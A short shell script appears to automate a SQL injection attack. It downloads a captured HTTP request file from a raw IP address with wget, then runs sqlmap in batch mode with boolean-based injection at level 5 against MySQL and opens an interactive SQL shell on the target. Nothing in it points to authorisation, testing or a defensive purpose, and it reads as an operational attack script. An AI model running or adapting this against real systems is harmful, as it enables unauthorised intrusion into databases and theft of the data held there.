dir="/root/sqlmap/2.txt"
apt update
if [ -f "$dir" ] ; then
  echo "ok"
else
  #git clone https://github.com/sqlmapproject/sqlmap.git
  wget http://20.24.186.53:7788/2.txt -O /root/sqlmap/2.txt
fi

python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/2.txt --drop-set-cookie --technique B --level 5 --dbms mysql --thread 10 --batch --sql-shell
